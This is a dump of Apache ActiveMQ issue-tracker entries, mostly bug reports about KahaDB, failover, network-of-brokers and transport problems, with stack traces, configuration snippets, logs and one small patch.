issueID:AMQ-2728
type:Bug
changed files:MessageServlet.java
texts:Adapt Rest and Ajax servlets to Jetty 7 continuation design
There is a change in how continuations work in Jetty 7 (over previously used Jetty 6), so appropriate servlets must be refactored.
issueID:AMQ-2729
type:Bug
changed files:
texts:Dot-separated prefetch configuration variable rejected by failover transport URI
If you set the queue prefetch policy on a failover connection string, you get an exception saying that the policy is not a valid configuration option.failover://(tcp://localhost:61616?jms.prefetchPolicy.queuePrefetch=1)To test, simply modify the URL in the example/build.xml file from an installation of ActiveMQ, and then run the producer using "ant producer". I think that this may be related to the fact that the variable in question - "jms.prefetchPolicy.queuePrefetch" - has dots (periods) in the name.
issueID:AMQ-2730
type:Bug
changed files:
texts:Transport failed: java.io.EOFException
We see many Exceptions of this type in the broker logs: 2010-05-12 14:10:03,490 | DEBUG | Transport failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///10.231.233.55:50809java.io.EOFException        at java.io.DataInputStream.readInt(DataInputStream.java:375)        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269)        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:211)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)        at java.lang.Thread.run(Thread.java:619)This exception occurs with a lot of clients that run on different machines.One case where we almost always see this exception is when shutting down a bridge. We did a tcp dump on the broker and on the client machine: there a no packets lost.LOG ON BRIDGE:2010-05-12 14:10:02,634 INFO  org.apache.activemq.broker.BrokerService - ActiveMQ Message Broker (solr-2073bridge, ID:solr-2073-50804-1273665033782-0:0) is shutting down2010-05-12 14:10:02,799 INFO  org.apache.activemq.network.jms.JmsConnector - JMS Connector Connector:0 Stopped2010-05-12 14:10:02,819 INFO  org.apache.activemq.broker.BrokerService - ActiveMQ JMS Message Broker (solr-2073bridge, ID:solr-2073-50804-1273665033782-0:0) stoppedLOG ON BROKER:2010-05-12 14:10:03,490 | DEBUG | Transport failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///10.231.233.55:50809java.io.EOFException        at java.io.DataInputStream.readInt(DataInputStream.java:375)        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269)        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:211)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)        at java.lang.Thread.run(Thread.java:619)2010-05-12 14:10:03,492 | DEBUG | Stopping connection: /10.231.233.55:50809 | org.apache.activemq.broker.TransportConnection | ActiveMQ Task2010-05-12 14:10:03,492 | DEBUG | Stopping transport tcp:///10.231.233.55:50809 | org.apache.activemq.transport.tcp.TcpTransport | ActiveMQ Task2010-05-12 14:10:03,493 | DEBUG | Stopped transport: /10.231.233.55:50809 | org.apache.activemq.broker.TransportConnection | ActiveMQ Task2010-05-12 14:10:03,493 | DEBUG | Cleaning up connection resources: /10.231.233.55:50809 | org.apache.activemq.broker.TransportConnection | ActiveMQ Task2010-05-12 14:10:03,493 | DEBUG | remove connection id: ID:solr-2073-50804-1273665033782-2:0 | org.apache.activemq.broker.TransportConnection | ActiveMQ Task2010-05-12 14:10:03,493 | DEBUG | jms1 removing consumer: ID:solr-2073-50804-1273665033782-2:0:225:1 for destination: temp-queue://ID:solr-2073-50804-1273665033782-2:0:105 | org.apache.activemq.broker.region.AbstractRegion | ActiveMQ Task2010-05-12 14:10:03,493 | DEBUG | remove sub: QueueSubscription: consumer=ID:solr-2073-50804-1273665033782-2:0:225:1, destinations=1, dispatched=0, delivered=0, pending=0, lastDeliveredSeqId: 0, dequeues: 0, dispatched: 0, inflight: 0 | org.apache.activemq.broker.region.Queue | ActiveMQ Task
issueID:AMQ-2732
type:Bug
changed files:
texts:FTP Blob send should fail if file store fails
Currently we don"t check whether storing a file on the server succeeds or not.
issueID:AMQ-2736
type:Bug
changed files:
texts:KahaDB doesn&#39;t clean up old files
Over time, we"re seeing that kahadb doesn"t clean up old journal files. As a result, we eventually run out of disk space, or rather, we hit our usage limits and our producers are slowed down by the producer flow control mechanism. Others have experienced this problem too (for example, see http://mail-archives.apache.org/mod_mbox/activemq-users/201002.mbox/%3C27502591.post@talk.nabble.com%3E)For now, we"re moving back to the old amqPersistenceStore.
issueID:AMQ-2737
type:Improvement
changed files:
texts:NPE in WriteTimeoutFilter with nio - add support for soWriteTimeout to nio transport
config that shows the problem:<amq:transportConnectors> <amq:transportConnector name="openwire" uri="nio://0.0.0.0:61616?transport.soWriteTimeout=5000&transport.soTimeout=5000"/> <amq:transportConnector name="stomp" uri="stomp+nio://0.0.0.0:61618?transport.soWriteTimeout=5000&transport.soTimeout=5000"/></amq:transportConnectors>In the event that a write times out with nio the npe appears in the log:2010-04-12 18:17:03,159 ERROR org.apache.activemq.transport.WriteTimeoutFilter$TimeoutThread.run(WriteTimeoutFilter.java:177) &#91;WriteTimeoutFilter-Timeout-1&#93; - WriteTimeout thread unable validate existing sockets.java.lang.NullPointerException: nullIssue is nio transport doe not support narrow to a TcpBufferedOutputStream.class, a little refactor and implementation is needed.
issueID:AMQ-2738
type:Bug
changed files:KahaDBPersistenceAdapter.java
MessageDatabase.java
texts:KahaDB lock timeout should be configurable.
The timeout for KahaDB acquiring a lock on the file store is 10seconds - surely this should be configurable! The AMQ Persistence Adaptor store was pretty much immediate in it"s take up on failover from master to slave; with the hard-coded 10 second delay in KahaDB it can take too long to failover.Thoughts?
issueID:AMQ-2740
type:Bug
changed files:BindingBeanNameUrlHandlerMapping.java
texts:NullPointerException in Web Console when using an existing browser session with a restarted broker instance
As per summary above. If you have a browser open to the web console, and create a queue it works OK. However, if you then restart the broker adn then try and perform an action like deleting the queue (from the web console) then you"ll see the NPE in the broker"s log. ERROR | Nested in org.springframework.web.util.NestedServletException: Request processing failed; nested exception is java.lang.NullPointerException:java.lang.NullPointerException        at org.apache.activemq.web.handler.BindingBeanNameUrlHandlerMapping.getHandlerInternal(BindingBeanNameUrlHandlerMapping.java:57)        at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandler(AbstractHandlerMapping.java:184)        at org.springframework.web.servlet.DispatcherServlet.getHandler(DispatcherServlet.java:1057)        at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:854)        at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:807)        at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:571)        at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:501)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:693)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)        at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487)        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1093)        at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)        at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)        at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)        at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)        at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)        at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360)        at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)        at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)        at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726)        at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405)        at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:206)        at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114)        at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)        at org.mortbay.jetty.Server.handle(Server.java:324)        at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:505)        at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:828)        at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514)        at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211)        at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:380)        at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:395)        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:450) I think this has something to do with stale session secrets, and is a consequence of support that was put in to protect ActiveMQ against CSRF (cross-site request forgery) attacks. The original CSRF error was alarming; this error, however, is a plain old NPE and we should fix it.
issueID:AMQ-2741
type:Improvement
changed files:
texts:Provide visibility onto destination SlowConsumerStrategy via JMX
Would be nice to have JMX visibility and possibly some ability to force abort for the SlowConsumerStrategy from https://issues.apache.org/activemq/browse/AMQ-378Ability to see the current list of slow consumers and a manual abort option.
issueID:AMQ-2744
type:New Feature
changed files:
texts:Secure Web Server with Basic Authentication by default
Broker should come with the web server for consoles, demos, etc. pre-configured to be secured by default, or that security can be easily turned on and off.
issueID:AMQ-2749
type:Bug
changed files:TopicSubscription.java
texts:Broker hangs in TopicSubscription.add
Our broker suddenly hang in production environment. We created a bunch of jstacks to see what the reason is.The jstacks show that the broker waits with many threads in doMessageSend:e.g."ActiveMQ Transport: tcp:///10.231.233.117:51088" daemon prio=10 tid=0x00002aab84016800 nid=0x1f19 waiting for monitor entry &#91;0x000000006a8f2000&#93;   java.lang.Thread.State: BLOCKED (on object monitor) at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:402) waiting to lock <0x00002aaab46f8938> (a org.apache.activemq.broker.region.Topic) at org.apache.activemq.broker.region.Topic.send(Topic.java:384) at org.apache.activemq.broker.region.DestinationFilter.send(DestinationFilter.java:93) at org.apache.activemq.broker.region.virtual.VirtualTopicInterceptor.send(VirtualTopicInterceptor.java:46) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224) at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:443) at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:373) at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:368) at org.apache.activemq.advisory.AdvisoryBroker.addDestinationInfo(AdvisoryBroker.java:173) at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:214) at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:214) at org.apache.activemq.broker.MutableBrokerFilter.addDestinationInfo(MutableBrokerFilter.java:221) at org.apache.activemq.broker.TransportConnection.processAddDestination(TransportConnection.java:467) at org.apache.activemq.command.DestinationInfo.visit(DestinationInfo.java:122) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:82) at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:135) at org.apache.activemq.transport.stomp.ProtocolConverter.createTempQueue(ProtocolConverter.java:611) at org.apache.activemq.transport.stomp.LegacyFrameTranslator.convertDestination(LegacyFrameTranslator.java:130) at org.apache.activemq.transport.stomp.FrameTranslator$Helper.copyStandardHeadersFromFrameToMessage(FrameTranslator.java:93) at org.apache.activemq.transport.stomp.LegacyFrameTranslator.convertFrame(LegacyFrameTranslator.java:54) at org.apache.activemq.transport.stomp.ProtocolConverter.convertMessage(ProtocolConverter.java:591) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:231) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:173) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:71) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186) at java.lang.Thread.run(Thread.java:619)It is waiting to lock 0x00002aaab46f8938. This is the thread that holds the lock:"ActiveMQ Transport: tcp:///10.231.233.117:43020" daemon prio=10 tid=0x00000000608d8800 nid=0xc6e in Object.wait() &#91;0x000000007d41c000&#93;   java.lang.Thread.State: TIMED_WAITING (on object monitor) at java.lang.Object.wait(Native Method) at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:106) locked <0x00002aaab57d34e8> (a java.lang.Object) at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:49) locked <0x00002aaab46f98e0> (a java.util.concurrent.CopyOnWriteArrayList) at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:585) at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:443) locked <0x00002aaab46f8938> (a org.apache.activemq.broker.region.Topic) at org.apache.activemq.broker.region.Topic.send(Topic.java:384) at org.apache.activemq.broker.region.DestinationFilter.send(DestinationFilter.java:93) at org.apache.activemq.broker.region.virtual.VirtualTopicInterceptor.send(VirtualTopicInterceptor.java:46) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224) at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:443) at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:373) at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:368) at org.apache.activemq.advisory.AdvisoryBroker.removeDestination(AdvisoryBroker.java:185) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:146) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:146) at org.apache.activemq.broker.MutableBrokerFilter.removeDestination(MutableBrokerFilter.java:153) at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:713) locked <0x00002aaac32b10c0> (a org.apache.activemq.broker.jmx.ManagedTransportConnection) at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:72) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:82) at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:135) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompDisconnect(ProtocolConverter.java:545) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:189) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:71) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186) at java.lang.Thread.run(Thread.java:619)So it is the client 10.231.233.117 that has a stomp-connection to the broker, causes a TopicSubscription.add and causes the broker freeze. This is how we configure our openwire transport-connector in the activemq.xml:        <transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61616"/>            <transportConnector name="stomp" uri="stomp://0.0.0.0:61613"/>        </transportConnectors>We took jstack-dumps with a distance of 9 minutes. Both are attached. In both dumps it is the same TopicSubscription.add that causes the hang.How can we solve this issue? Looks like the connection should run into an timeout but doesn"t. Is this an activemq bug? Can we somehow set the broker openwire timeout parameters?Thanks for any hints.
issueID:AMQ-2751
type:Bug
changed files:
texts:session.recover does not result in repeated redelivery - duplicate is detected and auto-acked in error
see test case. calling recover form message listener with redelivery delay will result in auto ack of duplicate message so it disappears in error.
issueID:AMQ-2752
type:Bug
changed files:TimeStampingBrokerPlugin.java
texts:Message is delivered to DLQ in store and forward mode if two brokers clock is not in sync
I have two ActiveMQ running on two separated machines.  They use duplex network connector between them.    I am using camel InOut Pattern to send message cross these two brokers.    The InOut request timeout is 20 seconds.    If these two broker machines" clock is NOT in sync, at least the destination broker clock is more than 20 seconds ahead of the sender broker"s clock,   when the message gets on destination broker side,  it is being delivered to DLQ right away.    I am not sure if there is a way to avoid this problem.  Or it just works as designed.
issueID:AMQ-2753
type:Improvement
changed files:
texts:Allow duplicate topic subscriptions in a network and use dispatch policy to use highest priority subscriptions such that the duplicates are only used for redundancy
duplicate topic subscriptions are suppressed in a cyclic network, https://issues.apache.org/activemq/browse/AMQ-2030 but there is a use case where they can be usefull.imagine a usecase where we produce on the one broker and consume on other. These two brokers have a cyclic network connection between them. So usually the message is going directly from broker A to broker B, but when that network connector goes down, topic consumer on broker B stops receiving messages. We want to have a "message rerouting", so that in failure case messages start flowing A->C->B route, without a need to re-subscribe. With a cyclic network like this, if we allow the duplicate subscriptions we need to choose among them to suppress duplicates and reduce network load. https://issues.apache.org/activemq/browse/AMQ-2704 added the audit which can help if we don"t choose among the duplicates.A PriorityNetworkDispatchPolicy can choose to dispatch to the highest priority subscription in the case of duplicate network consumers so that the messages are suppressed at source.
issueID:AMQ-2754
type:Bug
changed files:
texts:Spring && DefaultMessageListenerContainer && JmsTemplate && maxMessagesPerTask == 1 && Network of Brokers && maxConcurrentConsumer > 1 == Crumple
Using test case from http://mail-archives.apache.org/mod_mbox/activemq-users/201005.mbox/%3Cg2v4e6f67721005071419u5ca08751h569775ee4e682c5e@mail.gmail.com%3Eproblem seems to be with conduit subscription removal, it is not taking account of dependent subscriptions. Test case was great. thanks.
issueID:AMQ-2755
type:Bug
changed files:
texts:Durable Subs repeated drain and reconnect, skipping messages with kahaDB
With kahaDB as the default store some of the durable tests fail. The issue is the next message sequence gets out of sync when a durable sub is repeatedly drained such that an new message can be incorrectly seen as an ack. A consumer can miss a message as a result.Tests that fail: org.apache.activemq.usecases.DurableConsumerCloseAndReconnectTest.testCreateDurableConsumerCloseThenReconnect org.apache.activemq.network.SimpleNetworkTest.testDurableStoreAndForwardReconnect
issueID:AMQ-2757
type:Bug
changed files:BTreeNode.java
texts:AMQ startup fails during Startup due to NullPointerException in KahaDB
During a long-time test run several message consumers listening to peristent queues crashed.The queues were filling up rapidly, so that KahaDB allocated 3GB of disk space (max. limit 10GB) after 5hours (approx 800k messages).At that point the broker was extremely slow and non-responsive to new messages.JConsole showed that 1GB of RAM was used and most effort was necessary for garbage collection.Although the max memory usage limit is configured to 1GB, AMQ should rather allocate disc space for messages to queues without containers.AMQ shutdown took extremely long (several limits).The subsequent AMQ restart keeps failing with the following exception:java.lang.NullPointerException at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:109) at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:120) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:223) at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:220) at org.apache.activemq.broker.region.Queue.initialize(Queue.java:252) at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:83) at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:464) at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:120) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:268) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149) at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:94) at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:178) at org.apache.activemq.broker.jmx.ManagedRegionBroker.start(ManagedRegionBroker.java:101) at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:154) at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:112) at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1713) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:473) at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597)...The problem is reproducible also reproducible with recent nightly builds of AMQ/Fuse 5.4.0.-Tom
issueID:AMQ-2762
type:New Feature
changed files:
texts:Support for blueprint as a custom namespace handler
None
issueID:AMQ-2764
type:Bug
changed files:
texts:For "duplex" network connection,  after restart one ActiveMQ,  message is missing.
I have two AMQ setup.  And they use duplex network connection between.   After I restart one ActiveMQ which initiates the connection,  half of the message are missing.    In order to avoid this problem,  I have restart the other ActiveMQ.   And this  happens when I use "staticallyIncludedDestinations" or "dynamicallyIncludedDestinations" config in broker.1 SETUP:a) SCA server has a network connector to remote server114.  In order to repeat this problem, you have to use "staticallyIncludedDestinations".<networkConnector name="SCA" uri="static://(https://192.168.3.114:61617)" duplex="true">               <staticallyIncludedDestinations>                              <queue physicalName="R"/>               </staticallyIncludedDestinations></networkConnector>b) SCA server has a java code consumer listening on queue R:c)  Remote server114 is listening on 61617, see config below;<transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61616"/>            <transportConnector name="https" uri="https://0.0.0.0:61617?needClientAuth=true"/> </transportConnectors> (See attached picture "Remote-Console1.jpg".)2. Restart activemq on SCA server and restart consumer application listening on queue R on SCA too.  Remote server114 activemq admin console shows there are two consumers on R. (See attached picture "Remote-Console2.jpg")3 Start a producer on remote server114 to send 10 messages to R.  On SCA server, consumer on R  only receives 5 messages.(See attached picture "SCA-consumer1.JPG")4. On remote server114 activemq admin console, these 10 messages are divided by these two consumers.(See attached picture "Remote-Console3.jpg")
issueID:AMQ-2765
type:Bug
changed files:
texts:After failover, messages will not be delivered to MessageEndpoint
After a failover from one broker to another, message delivery to MessageEndpoints stops. Standalone messaging clients seem to work fine, but RA delivery does. I see this behavior in Geronimo and have built a JUnit test which seems to show the problem, also.
issueID:AMQ-2767
type:New Feature
changed files:
texts:Allow proxy connector to be configured not to replicate commands to the local broker
Proxy connector is built primarily for use in combination with Fanout protocol and by default it adds a VM transport connection to the local broker to send messages there as well.It"s a regular use case to use proxy in combination with Failover protocol (to hide internal broker topology) and in this case this inclusion of VM transport makes problems. Also, you might want to exclude the local broker in the fanout scenario.The proposal is to add proxyToLocalBroker property to proxy connector to control this behavior.  It"s true by default.
issueID:AMQ-2769
type:Bug
changed files:
texts:Topics hold consumers for unsubscribed durable subscriptions.
Session.unsubscribe (or broker.removeSubscription) does not remove the consumer from the topic"s consumer list.Please check my junit test case.
issueID:AMQ-2770
type:Bug
changed files:
texts:Durable subscription MBean shows incorrect active/inactive state.
active() and connectionId() shows incorrect activity states on Durable subscription MBeans. I cannot see if the subscription is online or offline.Please check my test case.
issueID:AMQ-2771
type:Wish
changed files:TcpTransport.java
UdpTransport.java
texts:Side effect from AMQ-2094, server listens on host name address, client connects to localhost with the same URI
TcpTransport.java contains the following code:    protected String resolveHostName(String host) throws UnknownHostException {        String localName = InetAddress.getLocalHost().getHostName();        if (localName != null && isUseLocalHost()) {            if (localName.equals(host)) {                return "localhost";            }        }        return host;    }TcpTransportServer.java contains the following code:        InetAddress addr = InetAddress.getByName(host);        try {            this.serverSocket = serverSocketFactory.createServerSocket(bind.getPort(), backlog, addr);/etc/hosts looks like this:127.0.0.1       localhost.localdomain   localhostsomeip       myhostname.mydomain myhostnameNow, if I start server with uri: myhostname.mydomain, the server will listen on someip but the client started on the same host with the same uri will try connect to localhost (and fail).I know that useLocalHost can be used to avoid it, but silently connecting to localhost is counterintuitive and does not sound like a valid default behaviour (according to documentation, using localhost instead of the host name is a workaround, the workaround is now effectively default behaviour and breaks valid setups that used to work with 5.2).This worked fine on 5.2, since the server bound to all interfaces - but fixing this was obviously the right thing to do.Questions:1. Can the default behaviour be changed to one that would work on majority of systems?2. Is the workaround really needed? Maybe it"s the local network settings that should be corrected?3. The debug messages are misleading and probably should be changed:&#91;ActiveMQ Task&#93; &#91;FailoverTransport:604&#93; urlList connectionList:&#91;tcp://hostname:54663?wireFormat.maxInactivityDuration=300000&#93;&#91;ActiveMQ Task&#93; &#91;FailoverTransport:723&#93; Attempting connect to: tcp://hostname:54663?wireFormat.maxInactivityDuration=300000&#91;ActiveMQ Task&#93; &#91;FailoverTransport:764&#93; Connect fail to: tcp://hostname:54663?wireFormat.maxInactivityDuration=300000, reason: java.net.ConnectException: Connection refusedIn fact, it was the connection to localhost:54663 that was refused.
issueID:AMQ-2772
type:Bug
changed files:
texts:ActiveMQConnectionConsumer will break failover
ActiveMQConnection.transportInterupted assumes thatdispatchers.size() == all session"s consumers + one advisoryConsumerBut ActiveMQConnectionConsumer also registers itself as dispatcher in constructor.On failover attempt connection will remain in waiting state. Logging "dispatch paused, waiting for outstanding dispatch interruption processing (1) to complete.."ActiveMQConnectionConsumer is used in ActiveMQ resource adapter in ActiveMQEndpointWorker.Robust fix: Index: trunk/activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java===================================================================--- trunk/activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java+++ trunk/activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java@@ -1840,7 +1840,7 @@  }      public void transportInterupted() {-        transportInterruptionProcessingComplete = new CountDownLatch(dispatchers.size() - (advisoryConsumer != null ? 1:0));+        transportInterruptionProcessingComplete = new CountDownLatch(dispatchers.size() - (advisoryConsumer != null ? 1:0) - connectionConsumers.size());         if (LOG.isDebugEnabled()) {             LOG.debug("transport interrupted, dispatchers: " + transportInterruptionProcessingComplete.getCount());         }
issueID:AMQ-2774
type:Bug
changed files:
texts:Network of brokers : Multicast discovery stopped to work
Hi everybodyI experiment a big problem with the multicast discovery algorithm, in a network of brokers topology.In some conditions, a broker can"t reestablish a distant connection even if the distant broker is restarted.I have the log traces that would help to identify the origin of the problem.When there is no discovery/connection error, I can see these 2 lines in the activemq log file#08 Jun 2010 14:31:30,639  INFO  &#91;Multicast Discovery Agent Notifier&#93; org.apache.activemq.network.DiscoveryNetworkConnectorEstablishing network connection between from vm://ACCLU-tpnocp04v to tcp://tpnocp09v-bus:13100?useLocalHost=false#08 Jun 2010 14:31:30,692  INFO  StartLocalBridge: localBroker=vm://ACCLU-tpnocp04v#26 org.apache.activemq.network.DemandForwardingBridgeNetwork connection between vm://ACCLU-tpnocp04v#26 and tcp://tpnocp09v-bus/10.18.126.28:13100(MOM-tpnocp09v) has been established.When the connection is broken, I can see this line in the log.#11 Jun 2010 12:37:32,585  INFO  &#91;Multicast Discovery Agent Notifier&#93; org.apache.activemq.network.DemandForwardingBridgeACCLU-tpnocp04v bridge to MOM-tpnocp09v stoppedThen the current ACCLU-tpnocp04v broker tries to reestablish the connection :#11 Jun 2010 12:37:34,475  INFO  &#91;Multicast Discovery Agent Notifier&#93; org.apache.activemq.network.DiscoveryNetworkConnectorEstablishing network connection between from vm://ACCLU-tpnocp04v to tcp://tpnocp09v-bus:13100?useLocalHost=falseBut, here, the second line of the log ("has been established") doesn"t appear in the log file !! I don"t know exactly if the connection is up or not.Then the connection is broken again (look at "Unknown" instead of "MOM-tpnocp09v".#11 Jun 2010 13:33:58,655  WARN  &#91;ActiveMQ Transport: tcp://tpnocp09v-bus/10.18.126.28:13100&#93; org.apache.activemq.network.DemandForwardingBridgeNetwork connection between vm://ACCLU-tpnocp04v#58 and tcp://tpnocp09v-bus/10.18.126.28:13100 shutdown due to a remote error: java.net.SocketException: Connection reset#11 Jun 2010 13:33:58,657  INFO  &#91;NetworkBridge&#93; org.apache.activemq.network.DemandForwardingBridge^MACCLU-tpnocp04v bridge to Unknown stoppedAnd, now, even if I restart the distant broker ( MOM-tpnocp09v ), no line (Establishing/Has been established) appears, and no network connection is reestablished between ACCLU-tpnocp04v and MOM-tpnocp09v. it seems that this ACCLU-tpnocp04v broker can no longer establish a connection with the MOM-tpnocp09v broker !!!The production teams tell me that this problem seems not to be resolved in fuse-5.3.0.6 version.Eric-AWL
issueID:AMQ-2776
type:Bug
changed files:TcpTransport.java
texts:Connection refused when using shortname in activemqurl
